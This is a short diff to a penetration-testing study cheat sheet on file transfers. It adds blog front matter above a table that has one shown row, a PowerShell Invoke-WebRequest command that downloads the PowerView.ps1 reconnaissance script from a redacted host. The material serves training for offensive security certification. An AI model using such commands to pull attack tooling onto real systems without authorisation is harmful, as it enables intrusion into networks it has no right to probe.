@@ -1,3 +1,10 @@
+---
+layout: post
+title: "File Transfers"
+date: 2025-04-15
+categories: CheatSheets/CPTS
+---
+
 | **Command** | **Description** |
 | --------------|-------------------|
 | `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |
